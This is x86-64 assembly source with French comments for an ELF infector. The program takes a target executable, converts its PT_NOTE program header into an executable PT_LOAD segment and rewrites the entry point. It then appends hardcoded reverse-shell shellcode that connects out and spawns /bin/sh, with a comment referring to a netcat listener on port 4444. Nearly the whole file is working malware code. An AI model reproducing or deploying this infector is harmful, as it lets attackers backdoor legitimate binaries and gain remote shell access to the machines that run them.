section .data
    msg_error db "Erreur !", 0xa
    msg_error_len equ $ - msg_error



    entry_point db 0x48,0x3c ,0x00,0x0c,0x00, 0x00, 0x00, 0x00
    



    tp_load db 0x01
    offset_exagereted db 0x48,0x3c ,0x00,0x00
    droit_write_exe db 0x05

    vaddr_exagereted db 0x48,0x3c ,0x00,0x0c


    taille_exagereted db 0x00 ,0x10 ,0x00,0x00

    p_align db 0x00, 0x00, 0x20


    reverse_shell db 0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,0x97,0xb0,0x2a,0x48,0xb9,0xfe,0xff,0xee,0xa3,0x80,0xff,0xff,0xfe,0x48,0xf7,0xd9,0x51,0x54,0x5e,0xb2,0x10,0x0f,0x05,0x6a,0x03,0x5e,0xb0,0x21,0xff,0xce,0x0f,0x05,0x75,0xf8,0x99,0xb0,0x3b,0x52,0x48,0xb9,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x51,0x54,0x5f,0x0f,0x05


    ;lnvp 4444

    nonope db 0x00


section .bss
    buffer resb 2000      ; Buffer pour stocker les données lues
    file_name resq 40
    size_file_name resq 1

    file_descriptor resq 1

    offset_tp resq 1

    file_stat resq 10


section .text
global _start

_start:


    pop rax
    cmp rax, 2 ;; nb d'elem
    jne error

    ; on retire le nom du fichier executable
    pop rsi

    ; recuperation de l'argument 1
    pop rax
    mov [file_name], rax

    ; Ouverture du fichier en lecture ecriture 
    mov rax, 2
    mov rdi, [file_name]
    mov rsi, 2
    syscall

    ; verification des erreurs
    test rax, rax 
    js error


    ; Sauvegarde du descripteur de fichier
    mov [file_descriptor], rax



    ; Lecture du fichier
    mov rax, 0          
    mov rdi, [file_descriptor]
    mov rsi, buffer     
    mov rdx, 2000        
    syscall            

    mov rdi, 1              ; file descriptor 1 is stdout
    mov rax, 1              
    mov rsi, buffer       ; affichage du fic debug  
    syscall 



    ;init
    xor r9, r9
    mov r9, buffer
    xor rcx, rcx

;taille:
;   ; Appel système stat
;    mov rax, 4             ; Numéro d'appel système pour stat
;    mov rdi, [file_name]      ; Pointeur vers le nom du fichier
;    mov rsi, file_stat     ; Pointeur vers la structure stat
;    syscall

    ; Vérification du retour de l'appel système
;    cmp rax, 0             ; Vérifie si l'appel système a réussi (0) ou non
;    jl error      ; Si l'appel système a échoué, saute à l'étiquette syscall_error



mov r15, buffer

;a rendre dynamique plus tard
parse_phdr:
  xor rcx, rcx                       ; zero out rcx
  xor rdx, rdx                       ; zero out rdx
  mov cx, 12     ;  phnum
  mov rbx, 64    ; rbx contains the offset of the PHT
  mov dx,  56 ; rdx contains the size of an entry in the PHT

  loop_phdr:
    add rbx, rdx                   ; for every iteration, add size of a PHT entry
    dec rcx                        ; decrease phnum until we've iterated through 
    xor r13, r13      
    mov r13d , dword [r15 +rbx] ; all program headers or found a PT_NOTE segment
    cmp dword [r15 +rbx], 0x4  ; if 4, we have found a PT_NOTE segment, ; and head off to infect it
    je pt_note_found
    cmp rcx, 0
    jg loop_phdr


    jmp error 
  pt_note_found:

    mov [offset_tp], rbx

;    mov [offset_tp], rcx
    
    xor rcx,rcx

    xor rax, rax



;=============== entry point =================
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, 0x18     ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, entry_point   ; Nouvelles données à écrire
    mov rdx, 8 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   




; =============== PT NOte to PT LOAD =================
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]     ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    mov r10, 0          ; le déplacement à partir de l'offset spécifié
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, tp_load   ; Nouvelles données à écrire
    mov rdx, 1 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   

    
; =============== Changement droit  =================
xor rax, rax
 ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]  
    add rsi , 4   ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    mov r10, 0          ; le déplacement à partir de l'offset spécifié
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, droit_write_exe   ; Nouvelles données à écrire
    mov rdx, 1 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   



; =============== Address offset  =================
    xor rax, rax

    ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]  
    add rsi , 8   ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    mov r10, 0          ; le déplacement à partir de l'offset spécifié
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, offset_exagereted   ; Nouvelles données à écrire
    mov rdx, 3 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   



; =============== Virtual address  =================
    xor rax, rax

    ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]  
    add rsi , 16   ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, vaddr_exagereted   ; Nouvelles données à écrire
    mov rdx, 4 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   



; =============== Taille to exe  =================
    xor rax, rax

    ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]  
    add rsi , 32   ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, taille_exagereted   ; Nouvelles données à écrire
    mov rdx, 3 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   



; =============== Taille to exe 2 =================
    xor rax, rax
    ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]  
    add rsi , 40  ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, taille_exagereted   ; Nouvelles données à écrire
    mov rdx, 3 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   


; =============== p align =================
    xor rax, rax

    ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]  
    add rsi , 48  ; offset
   mov rdx, 0          ; déplacement à partir du début du fichier
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, p_align   ; Nouvelles données à écrire
    mov rdx, 3 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   




; =============== Ajout shell code  =================


    ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, 0 
    mov rdx, 2         ; déplacement à partir du début du fichier
    syscall  


     xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, reverse_shell   ; Nouvelles données à écrire
    mov rdx, 0x41 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   



sortie:


        ;fermeture du fichier
    mov rax, 3          
    mov rdi, [file_descriptor]       
    syscall  



    ; Code de sortie
    mov rax, 60    
    mov rdi, 0    
    syscall     


error:
    mov rax, 1
    mov rdi, 1
    mov rsi, msg_error
    mov rdx, msg_error_len
    syscall

    mov rax, 60
    mov rdi, 1
    syscall
